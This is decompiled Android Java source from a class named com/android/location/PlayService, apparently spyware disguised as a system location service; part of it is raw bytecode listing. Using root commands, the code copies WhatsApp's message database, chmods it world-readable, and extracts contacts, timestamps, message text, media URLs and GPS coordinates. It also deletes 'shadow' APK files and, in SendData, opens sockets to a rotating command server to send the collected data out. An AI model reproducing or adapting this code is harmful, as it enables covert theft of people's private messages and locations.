      localObject1 = str;
      l1 = l2;
      CopySU(sWhatsAppPath, (String)localObject2);
      localObject1 = str;
      l1 = l2;
      CopySU(sWhatsAppPath + "-shl", localObject2 + "-shl");
      localObject1 = str;
      l1 = l2;
      CopySU(sWhatsAppPath + "-shm", localObject2 + "-shm");
      localObject1 = str;
      l1 = l2;
      CopySU(sWhatsAppPath + "-wal", localObject2 + "-wal");
      localObject1 = str;
      l1 = l2;
      FLOG("Chmodimsya WA");
      localObject1 = str;
      l1 = l2;
      commandSU("chmod 777 " + (String)localObject2);
      localObject1 = str;
      l1 = l2;
      commandSU("chmod 777 " + (String)localObject2 + "-shl");
      localObject1 = str;
      l1 = l2;
      commandSU("chmod 777 " + (String)localObject2 + "-shm");
      localObject1 = str;
      l1 = l2;
      commandSU("chmod 777 " + (String)localObject2 + "-wal");
      localObject1 = str;
      l1 = l2;
      FLOG("WA while");
      localObject1 = str;
      l1 = l2;
      localObject3 = new File((String)localObject2);
      localObject1 = str;
      l1 = l2;
      if (((File)localObject3).exists())
      {
        localObject1 = str;
        l1 = l2;
        if (((File)localObject3).canRead())
        {
          localObject1 = str;
          l1 = l2;
          if (((File)localObject3).length() != 0L) {
            break label550;
          }
        }
      }
      localObject1 = str;
      l1 = l2;
      FLOG("WA db cannot read");
      l3 = l2;
      break label1335;
      label550:
      localObject1 = str;
      l1 = l2;
      FLOG("WA local=" + ((File)localObject3).exists() + ":" + ((File)localObject3).canRead());
      localObject1 = str;
      l1 = l2;
      localObject3 = SQLiteDatabase.openDatabase((String)localObject2, null, 1);
      localObject1 = str;
      l1 = l2;
      FLOG("Its open? " + ((SQLiteDatabase)localObject3).isOpen());
      localObject1 = str;
      l1 = l2;
      l3 = l2;
      if (!((SQLiteDatabase)localObject3).isOpen()) {
        break label1335;
      }
      localObject1 = str;
      l1 = l2;
      localObject2 = ((SQLiteDatabase)localObject3).query("messages", null, " _id > " + lWhatsAppCounter, null, null, null, " _id ASC ");
      if (localObject2 == null) {
        break label1319;
      }
      localObject1 = localObject2;
      l1 = l2;
      FLOG("ReadWhatsApp() " + ((Cursor)localObject2).getCount());
      l3 = l2;
      localObject1 = localObject2;
      l1 = l2;
      if (!((Cursor)localObject2).moveToFirst()) {
        break label1152;
      }
      localObject1 = localObject2;
      l1 = l2;
      FLOG("ReadWhatsApp > 0!");
      localObject1 = localObject2;
      l1 = l2;
      paramGZIPOutputStream.write(116);
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        Object localObject2;
        Object localObject3;
        String[] arrayOfString;
        EXCEPT(paramGZIPOutputStream, "Error processing whats app");
        l3 = l1;
        if (localObject1 == null) {
          break;
        }
        l3 = l1;
        if (((Cursor)localObject1).isClosed()) {
          break;
        }
        ((Cursor)localObject1).close();
        l3 = l1;
        break;
        l2 = l3;
        localObject1 = localObject2;
        l1 = l3;
        if (!((Cursor)localObject2).moveToNext())
        {
          continue;
          localObject1 = localObject2;
          l1 = l2;
          FLOG("Failed to open");
        }
      }
    }
    localObject1 = localObject2;
    l1 = l2;
    AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("_id")));
    localObject1 = localObject2;
    l1 = l2;
    str = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("key_remote_jid"));
    localObject1 = localObject2;
    l1 = l2;
    arrayOfString = str.split("@");
    localObject1 = localObject2;
    l1 = l2;
    if (arrayOfString.length > 0) {
      str = arrayOfString[0];
    }
    localObject1 = localObject2;
    l1 = l2;
    AddData(paramGZIPOutputStream, str);
    localObject1 = localObject2;
    l1 = l2;
    AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("key_from_me")));
    localObject1 = localObject2;
    l1 = l2;
    AddData(paramGZIPOutputStream, ((Cursor)localObject2).getLong(((Cursor)localObject2).getColumnIndex("timestamp")) / 1000L);
    localObject1 = localObject2;
    l1 = l2;
    AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("media_url")));
    localObject1 = localObject2;
    l1 = l2;
    AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("latitude")));
    localObject1 = localObject2;
    l1 = l2;
    AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("longitude")));
    localObject1 = localObject2;
    l1 = l2;
    AddData(paramGZIPOutputStream, ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("data")));
    long l3 = l2 + 1L;
    localObject1 = localObject2;
    l1 = l3;
    paramGZIPOutputStream.write(3);
    localObject1 = localObject2;
    l1 = l3;
    lWhatsAppCounter = ((Cursor)localObject2).getInt(((Cursor)localObject2).getColumnIndex("_id"));
    if (l3 > 200L)
    {
      localObject1 = localObject2;
      l1 = l3;
      paramGZIPOutputStream.write(2);
      label1152:
      localObject1 = localObject2;
      l1 = l3;
      if (!((Cursor)localObject2).isClosed())
      {
        localObject1 = localObject2;
        l1 = l3;
        ((Cursor)localObject2).close();
      }
      localObject1 = localObject2;
      l1 = l3;
      FLOG("red " + l3);
      l2 = l3;
      localObject1 = localObject2;
      l1 = l2;
      l3 = l2;
      if (!((SQLiteDatabase)localObject3).isOpen()) {
        break label1335;
      }
      localObject1 = localObject2;
      l1 = l2;
      ((SQLiteDatabase)localObject3).close();
      l3 = l2;
    }
    label1319:
    label1335:
    return l3;
  }
  
  void RemoveShadowApk(String paramString)
  {
    for (;;)
    {
      int i;
      try
      {
        FLOG("RemoveShadowApk");
        arrayOfFile = new File(paramString + "/").listFiles();
        if (arrayOfFile != null) {
          break label196;
        }
        FLOG("Cannot open " + paramString);
        return;
      }
      catch (Exception paramString)
      {
        File[] arrayOfFile;
        File localFile;
        EXCEPT(paramString, "RemoveShadowApk::Exception");
      }
      if (i < arrayOfFile.length)
      {
        if (((arrayOfFile[i].getName().startsWith("shadow")) && (arrayOfFile[i].getName().endsWith(".apk"))) || (arrayOfFile[i].getName().equals("app001.apk")))
        {
          FLOG(arrayOfFile[i].getName());
          localFile = new File(paramString + "/" + arrayOfFile[i].getName());
          if (localFile.canWrite())
          {
            localFile.delete();
            FLOG("deleted");
          }
        }
        i += 1;
      }
      else
      {
        return;
        label196:
        i = 0;
      }
    }
  }
  
  public void ReportPowerOff()
  {
    putEvent(res.getString(2130968589));
  }
  
  void Reverse4(byte[] paramArrayOfByte)
  {
    int i = paramArrayOfByte[0];
    paramArrayOfByte[0] = paramArrayOfByte[3];
    paramArrayOfByte[3] = paramArrayOfByte[2];
    paramArrayOfByte[2] = paramArrayOfByte[1];
    paramArrayOfByte[1] = paramArrayOfByte[3];
    paramArrayOfByte[3] = i;
  }
  
  public void SaveKnockTime()
  {
    SharedPreferences.Editor localEditor = mSettings.edit();
    if (localEditor == null)
    {
      FLOG("mSettings.edit(); failed");
      return;
    }
    localEditor.putLong("iLastKnockTime", getCurrentTime());
    localEditor.commit();
  }
  
  /* Error */
  public int SendData(String paramString, int paramInt)
  {
    // Byte code:
    //   0: getstatic 727	com/android/location/PlayService:iBufferSize	J
    //   3: l2i
    //   4: istore 5
    //   6: iload 5
    //   8: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   11: astore 25
    //   13: ldc_w 5682
    //   16: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   19: iconst_0
    //   20: istore 12
    //   22: aconst_null
    //   23: astore 15
    //   25: aconst_null
    //   26: astore 23
    //   28: aconst_null
    //   29: astore 14
    //   31: aconst_null
    //   32: astore 21
    //   34: aconst_null
    //   35: astore 22
    //   37: aconst_null
    //   38: astore 24
    //   40: aload 24
    //   42: astore 18
    //   44: aload 15
    //   46: astore 19
    //   48: aload 23
    //   50: astore 16
    //   52: aload 14
    //   54: astore 20
    //   56: aload 21
    //   58: astore 17
    //   60: aload 22
    //   62: astore 13
    //   64: new 864	java/lang/StringBuilder
    //   67: dup
    //   68: ldc_w 5684
    //   71: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   74: aload_1
    //   75: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   78: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   81: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   84: aload 24
    //   86: astore 18
    //   88: aload 15
    //   90: astore 19
    //   92: aload 23
    //   94: astore 16
    //   96: aload 14
    //   98: astore 20
    //   100: aload 21
    //   102: astore 17
    //   104: aload 22
    //   106: astore 13
    //   108: new 864	java/lang/StringBuilder
    //   111: dup
    //   112: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   115: aload_0
    //   116: invokevirtual 2170	com/android/location/PlayService:getFilesDir	()Ljava/io/File;
    //   119: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   122: ldc_w 1717
    //   125: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   128: aload_1
    //   129: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   132: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   135: astore 26
    //   137: aload 24
    //   139: astore 18
    //   141: aload 15
    //   143: astore 19
    //   145: aload 23
    //   147: astore 16
    //   149: aload 14
    //   151: astore 20
    //   153: aload 21
    //   155: astore 17
    //   157: aload 22
    //   159: astore 13
    //   161: new 1250	java/io/File
    //   164: dup
    //   165: aload 26
    //   167: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   170: invokevirtual 1257	java/io/File:exists	()Z
    //   173: ifne +133 -> 306
    //   176: aload 24
    //   178: astore 18
    //   180: aload 15
    //   182: astore 19
    //   184: aload 23
    //   186: astore 16
    //   188: aload 14
    //   190: astore 20
    //   192: aload 21
    //   194: astore 17
    //   196: aload 22
    //   198: astore 13
    //   200: aload_0
    //   201: aconst_null
    //   202: putfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   205: aload 24
    //   207: astore 18
    //   209: aload 15
    //   211: astore 19
    //   213: aload 23
    //   215: astore 16
    //   217: aload 14
    //   219: astore 20
    //   221: aload 21
    //   223: astore 17
    //   225: aload 22
    //   227: astore 13
    //   229: new 864	java/lang/StringBuilder
    //   232: dup
    //   233: ldc_w 5686
    //   236: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   239: aload 26
    //   241: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   244: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   247: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   250: aload 24
    //   252: astore 18
    //   254: aload 15
    //   256: astore 19
    //   258: aload 23
    //   260: astore 16
    //   262: aload 14
    //   264: astore 20
    //   266: aload 21
    //   268: astore 17
    //   270: aload 22
    //   272: astore 13
    //   274: aload_0
    //   275: getstatic 555	com/android/location/PlayService:res	Landroid/content/res/Resources;
    //   278: ldc_w 5687
    //   281: invokevirtual 1446	android/content/res/Resources:getString	(I)Ljava/lang/String;
    //   284: iconst_0
    //   285: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   288: invokespecial 2675	com/android/location/PlayService:UpdateState	(Ljava/lang/String;ZB)V
    //   291: iconst_0
    //   292: ifeq +11 -> 303
    //   295: new 1700	java/lang/NullPointerException
    //   298: dup
    //   299: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   302: athrow
    //   303: bipush 7
    //   305: ireturn
    //   306: aload 24
    //   308: astore 18
    //   310: aload 15
    //   312: astore 19
    //   314: aload 23
    //   316: astore 16
    //   318: aload 14
    //   320: astore 20
    //   322: aload 21
    //   324: astore 17
    //   326: aload 22
    //   328: astore 13
    //   330: aload_0
    //   331: aload_1
    //   332: invokevirtual 1998	com/android/location/PlayService:openFileInput	(Ljava/lang/String;)Ljava/io/FileInputStream;
    //   335: astore 15
    //   337: aload 15
    //   339: ifnonnull +148 -> 487
    //   342: aload 15
    //   344: astore 18
    //   346: aload 15
    //   348: astore 19
    //   350: aload 15
    //   352: astore 16
    //   354: aload 15
    //   356: astore 20
    //   358: aload 15
    //   360: astore 17
    //   362: aload 15
    //   364: astore 13
    //   366: new 864	java/lang/StringBuilder
    //   369: dup
    //   370: ldc_w 5689
    //   373: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   376: aload 15
    //   378: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   381: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   384: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   387: aload 15
    //   389: astore 18
    //   391: aload 15
    //   393: astore 19
    //   395: aload 15
    //   397: astore 16
    //   399: aload 15
    //   401: astore 20
    //   403: aload 15
    //   405: astore 17
    //   407: aload 15
    //   409: astore 13
    //   411: new 5691	java/io/FileNotFoundException
    //   414: dup
    //   415: invokespecial 5692	java/io/FileNotFoundException:<init>	()V
    //   418: athrow
    //   419: astore_1
    //   420: aload 18
    //   422: astore 13
    //   424: aload_0
    //   425: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   428: astore_1
    //   429: aload_1
    //   430: ifnull +23 -> 453
    //   433: aload 18
    //   435: astore 13
    //   437: aload_0
    //   438: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   441: invokevirtual 5693	java/nio/channels/SocketChannel:close	()V
    //   444: aload 18
    //   446: astore 13
    //   448: aload_0
    //   449: aconst_null
    //   450: putfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   453: aload 18
    //   455: astore 13
    //   457: aload_0
    //   458: getstatic 555	com/android/location/PlayService:res	Landroid/content/res/Resources;
    //   461: ldc_w 5694
    //   464: invokevirtual 1446	android/content/res/Resources:getString	(I)Ljava/lang/String;
    //   467: iconst_0
    //   468: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   471: invokespecial 2675	com/android/location/PlayService:UpdateState	(Ljava/lang/String;ZB)V
    //   474: aload 18
    //   476: ifnull +8 -> 484
    //   479: aload 18
    //   481: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   484: bipush 6
    //   486: ireturn
    //   487: aload 15
    //   489: astore 18
    //   491: aload 15
    //   493: astore 19
    //   495: aload 15
    //   497: astore 16
    //   499: aload 15
    //   501: astore 20
    //   503: aload 15
    //   505: astore 17
    //   507: aload 15
    //   509: astore 13
    //   511: new 864	java/lang/StringBuilder
    //   514: dup
    //   515: ldc_w 5696
    //   518: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   521: aload 15
    //   523: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   526: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   529: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   532: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   535: aload 15
    //   537: astore 18
    //   539: aload 15
    //   541: astore 19
    //   543: aload 15
    //   545: astore 16
    //   547: aload 15
    //   549: astore 20
    //   551: aload 15
    //   553: astore 17
    //   555: aload 15
    //   557: astore 13
    //   559: getstatic 767	com/android/location/PlayService:Server	Ljava/lang/String;
    //   562: invokevirtual 1649	java/lang/String:length	()I
    //   565: ifeq +72 -> 637
    //   568: aload 15
    //   570: astore 18
    //   572: aload 15
    //   574: astore 19
    //   576: aload 15
    //   578: astore 16
    //   580: aload 15
    //   582: astore 20
    //   584: aload 15
    //   586: astore 17
    //   588: aload 15
    //   590: astore 13
    //   592: getstatic 779	com/android/location/PlayService:Port	Ljava/lang/String;
    //   595: invokevirtual 1649	java/lang/String:length	()I
    //   598: ifeq +39 -> 637
    //   601: aload 15
    //   603: astore 18
    //   605: aload 15
    //   607: astore 19
    //   609: aload 15
    //   611: astore 16
    //   613: aload 15
    //   615: astore 20
    //   617: aload 15
    //   619: astore 17
    //   621: aload 15
    //   623: astore 13
    //   625: getstatic 771	com/android/location/PlayService:ServerList	Ljava/lang/String;
    //   628: getstatic 779	com/android/location/PlayService:Port	Ljava/lang/String;
    //   631: invokevirtual 1581	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   634: ifge +61 -> 695
    //   637: aload 15
    //   639: astore 18
    //   641: aload 15
    //   643: astore 19
    //   645: aload 15
    //   647: astore 16
    //   649: aload 15
    //   651: astore 20
    //   653: aload 15
    //   655: astore 17
    //   657: aload 15
    //   659: astore 13
    //   661: ldc_w 5698
    //   664: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   667: aload 15
    //   669: astore 18
    //   671: aload 15
    //   673: astore 19
    //   675: aload 15
    //   677: astore 16
    //   679: aload 15
    //   681: astore 20
    //   683: aload 15
    //   685: astore 17
    //   687: aload 15
    //   689: astore 13
    //   691: aload_0
    //   692: invokespecial 2670	com/android/location/PlayService:RotateHost	()V
    //   695: aload 15
    //   697: astore 18
    //   699: aload 15
    //   701: astore 19
    //   703: aload 15
    //   705: astore 16
    //   707: aload 15
    //   709: astore 20
    //   711: aload 15
    //   713: astore 17
    //   715: aload 15
    //   717: astore 13
    //   719: getstatic 767	com/android/location/PlayService:Server	Ljava/lang/String;
    //   722: invokevirtual 1649	java/lang/String:length	()I
    //   725: ifeq +72 -> 797
    //   728: aload 15
    //   730: astore 18
    //   732: aload 15
    //   734: astore 19
    //   736: aload 15
    //   738: astore 16
    //   740: aload 15
    //   742: astore 20
    //   744: aload 15
    //   746: astore 17
    //   748: aload 15
    //   750: astore 13
    //   752: getstatic 779	com/android/location/PlayService:Port	Ljava/lang/String;
    //   755: invokevirtual 1649	java/lang/String:length	()I
    //   758: ifeq +39 -> 797
    //   761: aload 15
    //   763: astore 18
    //   765: aload 15
    //   767: astore 19
    //   769: aload 15
    //   771: astore 16
    //   773: aload 15
    //   775: astore 20
    //   777: aload 15
    //   779: astore 17
    //   781: aload 15
    //   783: astore 13
    //   785: getstatic 771	com/android/location/PlayService:ServerList	Ljava/lang/String;
    //   788: getstatic 779	com/android/location/PlayService:Port	Ljava/lang/String;
    //   791: invokevirtual 1581	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   794: ifge +45 -> 839
    //   797: aload 15
    //   799: astore 18
    //   801: aload 15
    //   803: astore 19
    //   805: aload 15
    //   807: astore 16
    //   809: aload 15
    //   811: astore 20
    //   813: aload 15
    //   815: astore 17
    //   817: aload 15
    //   819: astore 13
    //   821: ldc_w 5700
    //   824: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   827: aload 15
    //   829: ifnull +8 -> 837
    //   832: aload 15
    //   834: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   837: iconst_2
    //   838: ireturn
    //   839: aload 15
    //   841: astore 18
    //   843: aload 15
    //   845: astore 19
    //   847: aload 15
    //   849: astore 16
    //   851: aload 15
    //   853: astore 20
    //   855: aload 15
    //   857: astore 17
    //   859: aload 15
    //   861: astore 13
    //   863: new 864	java/lang/StringBuilder
    //   866: dup
    //   867: ldc_w 5702
    //   870: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   873: getstatic 767	com/android/location/PlayService:Server	Ljava/lang/String;
    //   876: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   879: ldc_w 1262
    //   882: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   885: getstatic 779	com/android/location/PlayService:Port	Ljava/lang/String;
    //   888: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   891: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   894: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   897: aload 15
    //   899: astore 18
    //   901: aload 15
    //   903: astore 19
    //   905: aload 15
    //   907: astore 16
    //   909: aload 15
    //   911: astore 20
    //   913: aload 15
    //   915: astore 17
    //   917: aload 15
    //   919: astore 13
    //   921: new 5704	java/net/InetSocketAddress
    //   924: dup
    //   925: getstatic 767	com/android/location/PlayService:Server	Ljava/lang/String;
    //   928: getstatic 779	com/android/location/PlayService:Port	Ljava/lang/String;
    //   931: invokestatic 1752	java/lang/Integer:parseInt	(Ljava/lang/String;)I
    //   934: invokespecial 5706	java/net/InetSocketAddress:<init>	(Ljava/lang/String;I)V
    //   937: astore 14
    //   939: aload 15
    //   941: astore 18
    //   943: aload 15
    //   945: astore 19
    //   947: aload 15
    //   949: astore 16
    //   951: aload 15
    //   953: astore 20
    //   955: aload 15
    //   957: astore 17
    //   959: aload 15
    //   961: astore 13
    //   963: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   966: lstore 7
    //   968: aload 15
    //   970: astore 18
    //   972: aload 15
    //   974: astore 19
    //   976: aload 15
    //   978: astore 16
    //   980: aload 15
    //   982: astore 20
    //   984: aload 15
    //   986: astore 17
    //   988: aload 15
    //   990: astore 13
    //   992: aload_0
    //   993: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   996: ifnull +37 -> 1033
    //   999: aload 15
    //   1001: astore 18
    //   1003: aload 15
    //   1005: astore 19
    //   1007: aload 15
    //   1009: astore 16
    //   1011: aload 15
    //   1013: astore 20
    //   1015: aload 15
    //   1017: astore 17
    //   1019: aload 15
    //   1021: astore 13
    //   1023: aload_0
    //   1024: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1027: invokevirtual 5709	java/nio/channels/SocketChannel:isConnected	()Z
    //   1030: ifne +1606 -> 2636
    //   1033: aload 15
    //   1035: astore 18
    //   1037: aload 15
    //   1039: astore 19
    //   1041: aload 15
    //   1043: astore 16
    //   1045: aload 15
    //   1047: astore 20
    //   1049: aload 15
    //   1051: astore 17
    //   1053: aload 15
    //   1055: astore 13
    //   1057: aload_0
    //   1058: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1061: ifnull +93 -> 1154
    //   1064: aload 15
    //   1066: astore 18
    //   1068: aload 15
    //   1070: astore 19
    //   1072: aload 15
    //   1074: astore 16
    //   1076: aload 15
    //   1078: astore 20
    //   1080: aload 15
    //   1082: astore 17
    //   1084: aload 15
    //   1086: astore 13
    //   1088: ldc_w 5711
    //   1091: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1094: aload 15
    //   1096: astore 18
    //   1098: aload 15
    //   1100: astore 19
    //   1102: aload 15
    //   1104: astore 16
    //   1106: aload 15
    //   1108: astore 20
    //   1110: aload 15
    //   1112: astore 17
    //   1114: aload 15
    //   1116: astore 13
    //   1118: aload_0
    //   1119: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1122: invokevirtual 5693	java/nio/channels/SocketChannel:close	()V
    //   1125: aload 15
    //   1127: astore 18
    //   1129: aload 15
    //   1131: astore 19
    //   1133: aload 15
    //   1135: astore 16
    //   1137: aload 15
    //   1139: astore 20
    //   1141: aload 15
    //   1143: astore 17
    //   1145: aload 15
    //   1147: astore 13
    //   1149: aload_0
    //   1150: aconst_null
    //   1151: putfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1154: aload 15
    //   1156: astore 18
    //   1158: aload 15
    //   1160: astore 19
    //   1162: aload 15
    //   1164: astore 16
    //   1166: aload 15
    //   1168: astore 20
    //   1170: aload 15
    //   1172: astore 17
    //   1174: aload 15
    //   1176: astore 13
    //   1178: ldc_w 5713
    //   1181: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1184: aload 15
    //   1186: astore 18
    //   1188: aload 15
    //   1190: astore 19
    //   1192: aload 15
    //   1194: astore 16
    //   1196: aload 15
    //   1198: astore 20
    //   1200: aload 15
    //   1202: astore 17
    //   1204: aload 15
    //   1206: astore 13
    //   1208: aload_0
    //   1209: invokestatic 5716	java/nio/channels/SocketChannel:open	()Ljava/nio/channels/SocketChannel;
    //   1212: putfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1215: aload 15
    //   1217: astore 18
    //   1219: aload 15
    //   1221: astore 19
    //   1223: aload 15
    //   1225: astore 16
    //   1227: aload 15
    //   1229: astore 20
    //   1231: aload 15
    //   1233: astore 17
    //   1235: aload 15
    //   1237: astore 13
    //   1239: getstatic 807	com/android/location/PlayService:bUseBlocking	Z
    //   1242: ifeq +606 -> 1848
    //   1245: aload 15
    //   1247: astore 18
    //   1249: aload 15
    //   1251: astore 19
    //   1253: aload 15
    //   1255: astore 16
    //   1257: aload 15
    //   1259: astore 20
    //   1261: aload 15
    //   1263: astore 17
    //   1265: aload 15
    //   1267: astore 13
    //   1269: ldc_w 5718
    //   1272: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1275: aload 15
    //   1277: astore 18
    //   1279: aload 15
    //   1281: astore 19
    //   1283: aload 15
    //   1285: astore 16
    //   1287: aload 15
    //   1289: astore 20
    //   1291: aload 15
    //   1293: astore 17
    //   1295: aload 15
    //   1297: astore 13
    //   1299: aload_0
    //   1300: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1303: iconst_1
    //   1304: invokevirtual 5722	java/nio/channels/SocketChannel:configureBlocking	(Z)Ljava/nio/channels/SelectableChannel;
    //   1307: pop
    //   1308: aload 15
    //   1310: astore 18
    //   1312: aload 15
    //   1314: astore 19
    //   1316: aload 15
    //   1318: astore 16
    //   1320: aload 15
    //   1322: astore 20
    //   1324: aload 15
    //   1326: astore 17
    //   1328: aload 15
    //   1330: astore 13
    //   1332: aload_0
    //   1333: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1336: invokevirtual 5726	java/nio/channels/SocketChannel:socket	()Ljava/net/Socket;
    //   1339: aload_0
    //   1340: getfield 1023	com/android/location/PlayService:SOCKET_READ_TIMEOUT	I
    //   1343: invokevirtual 5731	java/net/Socket:setSoTimeout	(I)V
    //   1346: aload 15
    //   1348: astore 18
    //   1350: aload 15
    //   1352: astore 19
    //   1354: aload 15
    //   1356: astore 16
    //   1358: aload 15
    //   1360: astore 20
    //   1362: aload 15
    //   1364: astore 17
    //   1366: aload 15
    //   1368: astore 13
    //   1370: aload_0
    //   1371: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1374: aload 14
    //   1376: invokevirtual 5735	java/nio/channels/SocketChannel:connect	(Ljava/net/SocketAddress;)Z
    //   1379: pop
    //   1380: aload 15
    //   1382: astore 18
    //   1384: aload 15
    //   1386: astore 19
    //   1388: aload 15
    //   1390: astore 16
    //   1392: aload 15
    //   1394: astore 20
    //   1396: aload 15
    //   1398: astore 17
    //   1400: aload 15
    //   1402: astore 13
    //   1404: aload_0
    //   1405: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   1408: putfield 940	com/android/location/PlayService:lLastSendTime	J
    //   1411: aload 15
    //   1413: astore 18
    //   1415: aload 15
    //   1417: astore 19
    //   1419: aload 15
    //   1421: astore 16
    //   1423: aload 15
    //   1425: astore 20
    //   1427: aload 15
    //   1429: astore 17
    //   1431: aload 15
    //   1433: astore 13
    //   1435: new 864	java/lang/StringBuilder
    //   1438: dup
    //   1439: ldc_w 5737
    //   1442: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1445: aload 14
    //   1447: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   1450: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1453: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1456: aload 15
    //   1458: astore 18
    //   1460: aload 15
    //   1462: astore 19
    //   1464: aload 15
    //   1466: astore 16
    //   1468: aload 15
    //   1470: astore 20
    //   1472: aload 15
    //   1474: astore 17
    //   1476: aload 15
    //   1478: astore 13
    //   1480: new 864	java/lang/StringBuilder
    //   1483: dup
    //   1484: ldc_w 5739
    //   1487: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1490: aload_0
    //   1491: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1494: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   1497: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1500: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1503: aload 15
    //   1505: astore 18
    //   1507: aload 15
    //   1509: astore 19
    //   1511: aload 15
    //   1513: astore 16
    //   1515: aload 15
    //   1517: astore 20
    //   1519: aload 15
    //   1521: astore 17
    //   1523: aload 15
    //   1525: astore 13
    //   1527: aload_0
    //   1528: iload_2
    //   1529: invokevirtual 5741	com/android/location/PlayService:ReadLabel	(I)I
    //   1532: istore_3
    //   1533: aload 15
    //   1535: astore 18
    //   1537: aload 15
    //   1539: astore 19
    //   1541: aload 15
    //   1543: astore 16
    //   1545: aload 15
    //   1547: astore 20
    //   1549: aload 15
    //   1551: astore 17
    //   1553: aload 15
    //   1555: astore 13
    //   1557: new 864	java/lang/StringBuilder
